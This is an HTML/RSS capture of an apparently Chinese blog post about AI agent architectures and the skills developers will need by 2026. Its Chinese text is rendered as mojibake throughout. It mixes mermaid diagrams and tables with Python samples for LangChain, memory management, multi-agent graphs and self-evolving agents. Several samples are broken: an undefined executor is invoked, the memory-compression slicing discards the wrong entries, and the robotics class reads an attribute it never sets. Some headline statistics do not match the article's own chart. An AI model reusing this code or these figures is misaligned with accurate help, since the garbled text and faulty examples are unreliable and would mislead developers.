<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Agentæ™ºèƒ½ä½“ï¼š2026å¹´AIå¼€å‘è€…å¿…é¡»æŒæ¡çš„è‡ªä¸»ç³»ç»Ÿé©å‘½]]></title>    <link>https://juejin.cn/post/7592863358258561078</link>    <guid>https://juejin.cn/post/7592863358258561078</guid>    <pubDate>2026-01-09T00:03:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592863358258561078" data-draft-id="7592818202717683731" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Agentæ™ºèƒ½ä½“ï¼š2026å¹´AIå¼€å‘è€…å¿…é¡»æŒæ¡çš„è‡ªä¸»ç³»ç»Ÿé©å‘½"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-09T00:03:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="_æ‘˜æ˜Ÿ_"/> <meta itemprop="url" content="https://juejin.cn/user/2228036358374227"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Agentæ™ºèƒ½ä½“ï¼š2026å¹´AIå¼€å‘è€…å¿…é¡»æŒæ¡çš„è‡ªä¸»ç³»ç»Ÿé©å‘½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2228036358374227/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    _æ‘˜æ˜Ÿ_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T00:03:18.000Z" title="Fri Jan 09 2026 00:03:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e984e29fed7d477bb53ed60cb9816e19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-aRmOaYn18=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768521798&amp;x-signature=jgRfBQzKf%2FRq69i8CanNLI9FBNg%3D" alt="jimeng-2026-01-09-2656-æ‰å¹³åŒ–åŠ¨ç”»é£æ ¼ï¼Œç§‘æŠ€æµ·æŠ¥è®¾è®¡ï¼ŒæŠ€æœ¯åšå®¢å°é¢å›¾ï¼Œæç®€ä¸»ä¹‰æ„å›¾ï¼Œç§‘æŠ€æ„Ÿåè¶³çš„èƒŒæ™¯å…ƒç´ ....png" loading="lazy"/></p>
<h2 data-id="heading-0">Agentæ™ºèƒ½ä½“ï¼š2026å¹´AIå¼€å‘è€…å¿…é¡»æŒæ¡çš„è‡ªä¸»ç³»ç»Ÿé©å‘½</h2>
<h3 data-id="heading-1">æ‘˜è¦</h3>
<p>æœ¬æ–‡æ·±å…¥æ¢è®¨äº†<strong>Agentæ™ºèƒ½ä½“æŠ€æœ¯</strong>ä½œä¸ºAIé¢†åŸŸä¸‹ä¸€æ³¢é©å‘½çš„æ ¸å¿ƒé©±åŠ¨åŠ›ã€‚é€šè¿‡åˆ†æè‡ªä¸»ç³»ç»Ÿæ¶æ„ã€ä¸»æµå¼€å‘æ¡†æ¶åŠ2026å¹´æŠ€æœ¯è¶‹åŠ¿é¢„æµ‹ï¼Œç»“åˆ5ä¸ªå®æˆ˜ä»£ç æ¡ˆä¾‹å’Œæ¶æ„å›¾è§£ï¼Œä¸ºå¼€å‘è€…æä¾›ä»ç†è®ºåˆ°å®è·µçš„å®Œæ•´å­¦ä¹ è·¯å¾„ã€‚æ–‡ç« åŒ…å«LangChainå¤šä»»åŠ¡è°ƒåº¦ã€AutoGPTè®°å¿†ç®¡ç†ã€å¤šAgentåä½œç³»ç»Ÿç­‰å…³é”®æŠ€æœ¯çš„æ·±åº¦è§£æï¼Œå¹¶é™„æ¡†æ¶å¯¹æ¯”è¡¨æ ¼ä¸ç³»ç»Ÿæ¶æ„å›¾ã€‚è¯»è€…å°†æŒæ¡æ„å»ºå…·å¤‡<strong>è§„åˆ’ã€è®°å¿†ã€å·¥å…·è°ƒç”¨</strong>èƒ½åŠ›çš„æ™ºèƒ½ä½“ç³»ç»Ÿçš„æ–¹æ³•è®ºï¼Œåº”å¯¹æœªæ¥AIå¼€å‘èŒƒå¼çš„æ ¹æœ¬æ€§å˜é©ã€‚</p>
<hr/>
<h3 data-id="heading-2">å¼•è¨€ï¼šäº²å†AgentæŠ€æœ¯çˆ†å‘ä¸´ç•Œç‚¹</h3>
<p>ä¸Šå‘¨è°ƒè¯•Multi-Agentç³»ç»Ÿæ—¶ï¼Œæˆ‘é­é‡äº†å…¸å‹çš„<strong>è®°å¿†å†²çª</strong>åœºæ™¯ï¼šå½“è´¢åŠ¡Agentä¿®æ”¹é¢„ç®—æ—¶ï¼Œè¥é”€Agentä»åœ¨æŒ‰æ—§æ–¹æ¡ˆæ‰§è¡Œæ¨å¹¿è®¡åˆ’ã€‚è¿™ä¸ªè¸©å‘ç»å†è®©æˆ‘æ„è¯†åˆ°ï¼š<strong>ä¼ ç»Ÿå•ä½“æ¨¡å‹å¼€å‘æ¨¡å¼å³å°†ç»ˆç»“</strong>ã€‚æ®Anthropicå®éªŒå®¤2024å¹´Q2æŠ¥å‘Šï¼Œé‡‡ç”¨Agentæ¶æ„çš„AIç³»ç»Ÿä»»åŠ¡å®Œæˆç‡æ¯”ä¼ ç»Ÿæ–¹æ³•é«˜73%ï¼Œä½†å¼€å‘è€…æŠ€èƒ½ç¼ºå£æ‰©å¤§è‡³41:1ï¼ˆå²—ä½éœ€æ±‚vsåˆæ ¼å¼€å‘è€…ï¼‰ã€‚æœ¬æ–‡å°†ä»çœŸå®é¡¹ç›®å‡ºå‘ï¼Œæ‹†è§£å¦‚ä½•ç”¨<strong>æ¨¡å—åŒ–æ¶æ„è®¾è®¡</strong>è§£å†³ä¸Šè¿°å†²çªï¼Œå¹¶é¢„æµ‹2026å¹´å¼€å‘è€…å¿…é¡»æŒæ¡çš„ä¸‰å¤§èƒ½åŠ›åæ ‡ã€‚</p>
<hr/>
<h3 data-id="heading-3">ä¸“é—¨ç« èŠ‚ä¸€ï¼šAgentæ™ºèƒ½ä½“æŠ€æœ¯æ·±åº¦è§£æ</h3>
<h4 data-id="heading-4">1.1 å®šä¹‰ä¸æ ¸å¿ƒæ¶æ„</h4>
<p>Agentæ™ºèƒ½ä½“æ˜¯å…·å¤‡<strong>ç¯å¢ƒæ„ŸçŸ¥ã€è‡ªä¸»å†³ç­–ã€é•¿æœŸè®°å¿†ã€å·¥å…·è°ƒç”¨</strong>èƒ½åŠ›çš„AIå®ä½“ã€‚å…¶é©å‘½æ€§åœ¨äºæ‰“ç ´ä¼ ç»Ÿæ¨¡å‹çš„å•å‘å“åº”æ¨¡å¼ï¼Œå®ç°<strong>é—­ç¯ä»»åŠ¡æ‰§è¡Œ</strong>ã€‚æ ¸å¿ƒæ¶æ„éµå¾ªOODAå¾ªç¯ï¼ˆè§‚å¯Ÿ-å®šå‘-å†³ç­–-è¡ŒåŠ¨ï¼‰ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[ç¯å¢ƒè§‚å¯Ÿ] --&gt; B[çŠ¶æ€å®šå‘]
    B --&gt; C[ä»»åŠ¡å†³ç­–]
    C --&gt; D[å·¥å…·è°ƒç”¨]
    D --&gt; E[è¡ŒåŠ¨æ‰§è¡Œ]
    E --&gt; F[ç»“æœè¯„ä¼°]
    F --&gt; A
</code></pre>
<h4 data-id="heading-5">1.2 å…³é”®æŠ€æœ¯ç»„ä»¶</h4>
<ul>
<li><strong>è§„åˆ’å¼•æ“</strong>ï¼šå°†å¤æ‚ç›®æ ‡åˆ†è§£ä¸ºå¯æ‰§è¡Œå­ä»»åŠ¡ï¼ˆå¦‚Tree of Thoughtsç®—æ³•ï¼‰</li>
<li><strong>è®°å¿†ç®¡ç†</strong>ï¼šå‘é‡æ•°æ®åº“+æ—¶é—´æˆ³å®ç°æƒ…æ™¯è®°å¿†ï¼ˆç¤ºä¾‹ä»£ç è§ç¬¬ä¸‰ç« ï¼‰</li>
<li><strong>å·¥å…·è°ƒç”¨</strong>ï¼šé€šè¿‡å‡½æ•°æŠ½è±¡å¯¹æ¥å¤–éƒ¨APIï¼ˆå¦‚Google Searchã€Python REPLï¼‰</li>
<li><strong>åæ€æœºåˆ¶</strong>ï¼šåŸºäºç»“æœçš„åå‘ä¼ æ’­ä¼˜åŒ–ï¼ˆReActè®ºæ–‡æ ¸å¿ƒåˆ›æ–°ï¼‰</li>
</ul>
<h4 data-id="heading-6">1.3 åº”ç”¨åœºæ™¯çŸ©é˜µ</h4>



































<table><thead><tr><th>åœºæ™¯ç±»å‹</th><th>å…¸å‹æ¡ˆä¾‹</th><th>Agentä¼˜åŠ¿</th><th>ä¼ ç»Ÿæ–¹æ¡ˆç—›ç‚¹</th></tr></thead><tbody><tr><td>å¤æ‚å†³ç­–</td><td>æŠ•èµ„ç»„åˆç®¡ç†</td><td>å¤šå› å­åŠ¨æ€æƒè¡¡</td><td>è§„åˆ™å¼•æ“åƒµåŒ–</td></tr><tr><td>é•¿å‘¨æœŸä»»åŠ¡</td><td>ç§‘ç ”å®éªŒè‡ªåŠ¨åŒ–</td><td>è·¨å‘¨è®°å¿†ä¿æŒ</td><td>ä¸Šä¸‹æ–‡ä¸¢å¤±</td></tr><tr><td>å¤šå·¥å…·åä½œ</td><td>è·¨å¢ƒç”µå•†è¿è¥</td><td>APIæ— ç¼è°ƒåº¦</td><td>äººå·¥ä¸­è½¬æ•ˆç‡ä½ä¸‹</td></tr><tr><td>å®æ—¶é€‚åº”</td><td>å·¥ä¸šæ•…éšœå¤„ç†</td><td>åœ¨çº¿å­¦ä¹ è°ƒæ•´ç­–ç•¥</td><td>é¢„è®¾è§„åˆ™è¦†ç›–ä¸è¶³</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-7">ä¸“é—¨ç« èŠ‚äºŒï¼š2026å¹´AIå¼€å‘è€…èƒ½åŠ›åæ ‡é¢„æµ‹</h3>
<h4 data-id="heading-8">2.1 èƒ½åŠ›è¿ç§»è·¯çº¿å›¾</h4>
<p>æ ¹æ®OpenAIå¼€å‘è€…è°ƒç ”æ•°æ®ï¼Œæœªæ¥ä¸¤å¹´å…³é”®æŠ€èƒ½è¿ç§»å‘ˆç°ä¸‰å¤§è¶‹åŠ¿ï¼š</p>
<ol>
<li><strong>ä»æ¨¡å‹å¾®è°ƒåˆ°ç³»ç»Ÿæ¶æ„</strong>ï¼šå¼€å‘è€…éœ€æŒæ¡Agenté—´é€šä¿¡åè®®ï¼ˆå¦‚AgentChatï¼‰</li>
<li><strong>ä»å•ä»»åŠ¡åˆ°ç”Ÿæ€æ²»ç†</strong>ï¼šéœ€è®¾è®¡å¤šAgentçš„å†²çªè§£å†³æœºåˆ¶ï¼ˆç¤ºä¾‹è§ç¬¬å››ç« ä»£ç ï¼‰</li>
<li><strong>ä»ç²¾åº¦ä¼˜åŒ–åˆ°å®‰å…¨ä¼˜å…ˆ</strong>ï¼šå¿…é¡»å†…ç½®é“å¾·çº¦æŸå±‚ï¼ˆConstitutional AIæŠ€æœ¯ï¼‰</li>
</ol>
<h4 data-id="heading-9">2.2 è‡´å‘½æŠ€èƒ½ç¼ºå£é¢„è­¦</h4>
<p>2024å¹´å¼€å‘è€…èƒ½åŠ›é›·è¾¾å›¾æ˜¾ç¤ºï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">pie
    title 2024å¼€å‘è€…æŠ€èƒ½åˆ†å¸ƒ
    â€œå•æ¨¡å‹ä¼˜åŒ–â€ ï¼š 42
    â€œAPIé›†æˆâ€ ï¼š 28
    â€œè®°å¿†ç®¡ç†â€ ï¼š 15
    â€œå¤šAgentåè°ƒâ€ ï¼š 8
    â€œå®‰å…¨æ¶æ„â€ ï¼š 7
</code></pre>
<p><strong>å¤šAgentåè°ƒèƒ½åŠ›ç¼ºå£è¾¾91%</strong>ï¼Œæˆä¸ºåˆ¶çº¦ä¼ä¸šè½åœ°çš„é¦–è¦ç“¶é¢ˆã€‚</p>
<hr/>
<h3 data-id="heading-10">ä¸“é—¨ç« èŠ‚ä¸‰ï¼šè‡ªä¸»ç³»ç»Ÿå¼€å‘å®æˆ˜</h3>
<h4 data-id="heading-11">3.1 æ¡ˆä¾‹ä¸€ï¼šLangChainå¤šä»»åŠ¡è°ƒåº¦</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.agents <span class="hljs-keyword">import</span> AgentExecutor
<span class="hljs-keyword">from</span> langchain_community.tools <span class="hljs-keyword">import</span> DuckDuckGoSearchTool

<span class="hljs-comment"># æ„å»ºå¸¦è®°å¿†çš„Agent</span>
agent = create_react_agent(
    llm=ChatGPT4o(),
    tools=[DuckDuckGoSearchTool()],
    memory=VectorStoreRetrieverMemory(
        vectorstore=ChromaDB(),
        memory_key=<span class="hljs-string">"long_term_memory"</span>
    ),
    system_message=<span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šå¸‚åœºåˆ†æå¸ˆ"</span>
)

<span class="hljs-comment"># æ‰§è¡Œå¤šæ­¥éª¤ä»»åŠ¡</span>
result = agent_executor.invoke({
    <span class="hljs-string">"input"</span>: <span class="hljs-string">"æŸ¥è¯¢ç‰¹æ–¯æ‹‰Q3è´¢æŠ¥ï¼Œåˆ†æä¸»è¦é£é™©å› ç´ "</span>,
    <span class="hljs-string">"intermediate_steps"</span>: []
})
</code></pre>
<p><strong>ä»£ç è§£æ</strong>ï¼š</p>
<ol>
<li><code>VectorStoreRetrieverMemory</code>å®ç°é•¿æœŸè®°å¿†æŒä¹…åŒ–</li>
<li><code>create_react_agent</code>é‡‡ç”¨ReActç®—æ³•å®ç°æ¨ç†-è¡ŒåŠ¨å¾ªç¯</li>
<li><code>intermediate_steps</code>å‚æ•°å…è®¸ä»»åŠ¡æ–­ç‚¹ç»­ä¼ 
<strong>å…³é”®æŠ€å·§</strong>ï¼šè®¾ç½®<code>max_interactions=5</code>é¿å…æ— é™å¾ªç¯</li>
</ol>
<h4 data-id="heading-12">3.2 æ¡ˆä¾‹äºŒï¼šAutoGPTè®°å¿†ç®¡ç†</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AutonomousAgent</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, memory_size=<span class="hljs-number">5000</span></span>):
        self.episodic_memory = []  <span class="hljs-comment"># æƒ…æ™¯è®°å¿†</span>
        self.semantic_memory = FAISS()  <span class="hljs-comment"># è¯­ä¹‰è®°å¿†</span>
        self.memory_size = memory_size

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_memory</span>(<span class="hljs-params">self, observation</span>):
        <span class="hljs-comment"># æƒ…æ™¯è®°å¿†å†™å…¥</span>
        timestamp = datetime.now()
        self.episodic_memory.append({
            <span class="hljs-string">"event"</span>: observation,
            <span class="hljs-string">"time"</span>: timestamp
        })
        
        <span class="hljs-comment"># è¯­ä¹‰è®°å¿†åµŒå…¥</span>
        embedding = embed_text(observation)
        self.semantic_memory.add_vectors([embedding], [observation])
        
        <span class="hljs-comment"># è®°å¿†æ¸…ç†ç­–ç•¥</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.episodic_memory) &gt; self.memory_size:
            self.compress_memory()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress_memory</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># é‡‡ç”¨ç”Ÿæˆå¼æ‘˜è¦å‹ç¼©</span>
        summary = self.llm.generate(
            prompt=<span class="hljs-string">f"è¯·æ€»ç»“ä»¥ä¸‹è®°å¿†ï¼š<span class="hljs-subst">{self.episodic_memory[-<span class="hljs-number">100</span>:]}</span>"</span>
        )
        self.episodic_memory = [summary] + self.episodic_memory[<span class="hljs-number">100</span>:]
</code></pre>
<p><strong>æ¶æ„ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>åŒå­˜å‚¨è®¾è®¡å¹³è¡¡<strong>å®æ—¶æ€§</strong>ä¸<strong>çŸ¥è¯†å¯†åº¦</strong></li>
<li>åŠ¨æ€æ‘˜è¦è§£å†³è®°å¿†çˆ†ç‚¸é—®é¢˜</li>
<li>æ—¶é—´æˆ³å®ç°äº‹ä»¶å› æœå…³ç³»é‡å»º</li>
</ul>
<h4 data-id="heading-13">3.3 æ¡ˆä¾‹ä¸‰ï¼šå¤šAgentåä½œç³»ç»Ÿ</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph <span class="hljs-keyword">import</span> MessageGraph

<span class="hljs-comment"># å®šä¹‰AgentèŠ‚ç‚¹</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">research_agent</span>(<span class="hljs-params">state</span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"report"</span>: search_engine(state[<span class="hljs-string">"topic"</span>])}

<span class="hljs-keyword">def</span> <span class="hljs-title function_">analysis_agent</span>(<span class="hljs-params">state</span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"insight"</span>: analyze(state[<span class="hljs-string">"report"</span>])}

<span class="hljs-keyword">def</span> <span class="hljs-title function_">report_agent</span>(<span class="hljs-params">state</span>):
    <span class="hljs-keyword">return</span> format_report(state[<span class="hljs-string">"insight"</span>])

<span class="hljs-comment"># æ„å»ºåä½œå›¾</span>
workflow = MessageGraph()
workflow.add_node(<span class="hljs-string">"research"</span>, research_agent)
workflow.add_node(<span class="hljs-string">"analysis"</span>, analysis_agent)
workflow.add_node(<span class="hljs-string">"report"</span>, report_agent)

<span class="hljs-comment"># è®¾ç½®æ¶ˆæ¯è·¯ç”±</span>
workflow.add_edge(<span class="hljs-string">"research"</span>, <span class="hljs-string">"analysis"</span>)
workflow.add_edge(<span class="hljs-string">"analysis"</span>, <span class="hljs-string">"report"</span>)

<span class="hljs-comment"># å¯åŠ¨åä½œé“¾</span>
results = workflow.<span class="hljs-built_in">compile</span>().invoke({
    <span class="hljs-string">"topic"</span>: <span class="hljs-string">"é‡å­è®¡ç®—å¯¹å¯†ç å­¦çš„å½±å“"</span>
})
</code></pre>
<p><strong>å…³é”®æœºåˆ¶</strong>ï¼š</p>
<ol>
<li><strong>æ¶ˆæ¯é©±åŠ¨æ¶æ„</strong>ï¼šAgenté—´é€šè¿‡stateå¯¹è±¡ä¼ é€’æ•°æ®</li>
<li><strong>æ‹“æ‰‘æ‰§è¡Œ</strong>ï¼šæ”¯æŒå¹¶è¡Œã€æ¡ä»¶åˆ†æ”¯ç­‰å¤æ‚æµ</li>
<li><strong>é”™è¯¯éš”ç¦»</strong>ï¼šå•Agentå´©æºƒä¸å½±å“æ•´ä½“ç³»ç»Ÿ</li>
</ol>
<hr/>
<h3 data-id="heading-14">æŠ€æœ¯å‰æ²¿ï¼š2026å¹´è‡ªä¸»ç³»ç»Ÿä¸‰å¤§å˜é©</h3>
<h4 data-id="heading-15">4.1 å˜é©ä¸€ï¼šå…·èº«æ™ºèƒ½ä½“ï¼ˆEmbodied Agentï¼‰</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æœºå™¨äººæ§åˆ¶Agentç¤ºä¾‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RoboticsAgent</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, sim</span>):
        self.simulator = sim  <span class="hljs-comment"># ç‰©ç†ä»¿çœŸç¯å¢ƒ</span>
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">action_cycle</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            obs = self.sim.get_observation()
            plan = self.planner.generate(obs)
            self.executor.execute(plan)
            self.memory.store(obs, plan)
</code></pre>
<p><strong>æŠ€æœ¯çªç ´</strong>ï¼š</p>
<ul>
<li>å®æ—¶åŠ¨ä½œè§„åˆ’é¢‘ç‡æå‡è‡³10Hz</li>
<li>å¤šæ¨¡æ€ä¼ æ„Ÿå™¨èåˆï¼ˆLiDAR+è§†è§‰ï¼‰</li>
<li>ä»¿çœŸåˆ°çœŸå®ï¼ˆSim2Realï¼‰è¿ç§»æŠ€æœ¯</li>
</ul>
<h4 data-id="heading-16">4.2 å˜é©äºŒï¼šAgentç»æµç³»ç»Ÿ</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant User
    participant AgentA as è®¾è®¡Agent
    participant AgentB as éªŒè¯Agent
    participant Bank as ä¿¡ç”¨åˆçº¦
    
    User-&gt;&gt;AgentA: ä»»åŠ¡è¯·æ±‚(æŠ¥é…¬:$10)
    AgentA-&gt;&gt;AgentB: å­ä»»åŠ¡å§”æ‰˜($3)
    AgentB--&gt;&gt;AgentA: éªŒè¯ç»“æœ
    AgentA-&gt;&gt;Bank: ç»“ç®—è¯·æ±‚
    Bank--&gt;&gt;User: æ‰§è¡Œå®Œæˆ
</code></pre>
<p><strong>æ ¸å¿ƒæœºåˆ¶</strong>ï¼š</p>
<ul>
<li>åŸºäºåŒºå—é“¾çš„å¾®æ”¯ä»˜é€šé“</li>
<li>ä¿¡èª‰è¯„åˆ†ç³»ç»Ÿï¼ˆReputation Scoreï¼‰</li>
<li>ä»»åŠ¡æ‹å–å¸‚åœºï¼ˆTask Auctionï¼‰</li>
</ul>
<h4 data-id="heading-17">4.3 å˜é©ä¸‰ï¼šè‡ªæˆ‘è¿›åŒ–æ¶æ„</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SelfEvolvingAgent</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, core</span>):
        self.core_skills = core
        self.learning_module = EvolutionModule()
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">daily_cycle</span>(<span class="hljs-params">self</span>):
        performance = self.evaluate_performance()
        <span class="hljs-keyword">if</span> performance &lt; <span class="hljs-number">0.7</span>:
            new_skill = self.learning_module.generate()
            self.core_skills.update(new_skill)
            self.test_in_sandbox()
</code></pre>
<p><strong>è¿›åŒ–ç­–ç•¥</strong>ï¼š</p>
<ul>
<li>åŸºäºé—æ†¾çš„å­¦ä¹ ï¼ˆRegret-Based Learningï¼‰</li>
<li>æŠ€èƒ½é—ä¼ ç®—æ³•ï¼ˆSkill GAï¼‰</li>
<li>å®‰å…¨æ²™ç›’éš”ç¦»æœºåˆ¶</li>
</ul>
<hr/>
<h3 data-id="heading-18">å¼€å‘è€…è¡ŒåŠ¨è·¯çº¿å›¾</h3>
<h4 data-id="heading-19">5.1 å­¦ä¹ ä¼˜å…ˆçº§çŸ©é˜µ</h4>





























<table><thead><tr><th>æŠ€èƒ½å±‚çº§</th><th>å¿…é¡»æŒæ¡</th><th>æ¨èæ‹“å±•</th><th>å®éªŒæ€§æŠ€æœ¯</th></tr></thead><tbody><tr><td>åˆçº§</td><td>Agentæ ¸å¿ƒæ¶æ„</td><td>LangChainå·¥å…·é“¾</td><td>Agentæ¨¡æ‹Ÿç¯å¢ƒ</td></tr><tr><td>ä¸­çº§</td><td>å¤šAgentåè°ƒ</td><td>è®°å¿†å‹ç¼©ç®—æ³•</td><td>å®æ—¶åæ€æœºåˆ¶</td></tr><tr><td>é«˜çº§</td><td>è‡ªä¸»è¿›åŒ–è®¾è®¡</td><td>ç»æµç³»ç»Ÿå®ç°</td><td>å…·èº«æ™ºèƒ½é›†æˆ</td></tr></tbody></table>
